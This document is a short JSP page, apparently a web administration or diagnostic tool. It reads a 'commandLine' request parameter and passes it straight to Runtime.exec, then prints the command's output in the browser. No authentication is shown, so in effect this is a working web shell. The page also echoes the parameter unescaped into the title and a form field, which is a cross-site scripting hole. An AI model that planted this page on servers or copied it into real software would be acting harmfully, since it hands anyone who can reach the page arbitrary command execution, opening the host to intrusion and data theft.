<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ page import="java.util.*, java.io.*"%>    
<%
	String commandLine = request.getParameter("commandLine"); //"df -k ";
	commandLine = commandLine == null ? "" : commandLine;
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title> Runtime.exec(<%= commandLine %>) </title>
<link rel="stylesheet" type="text/css" href="../mng.css">
</head>
<body>
<form>
Command <input type="text" name="commandLine" value="<%= commandLine %>"/><input type="submit"/>
</form>
<%
if(commandLine != null && commandLine.trim().length() > 0)
{
	try{
		Runtime runtime = Runtime.getRuntime();
		Process process = runtime.exec(commandLine);
		
		String inLine = "";
		BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
		out.println("<pre>");
		while ((inLine = in.readLine()) != null) {
			out.println(inLine + "<br>");
			out.flush();
		}
		out.println("</pre>");

		in.close();
//		process.destroy();
	}catch(Exception e){
		out.println("Error: " + e.getMessage());		
	}finally{
		
	}
}
%>
</body>
</html>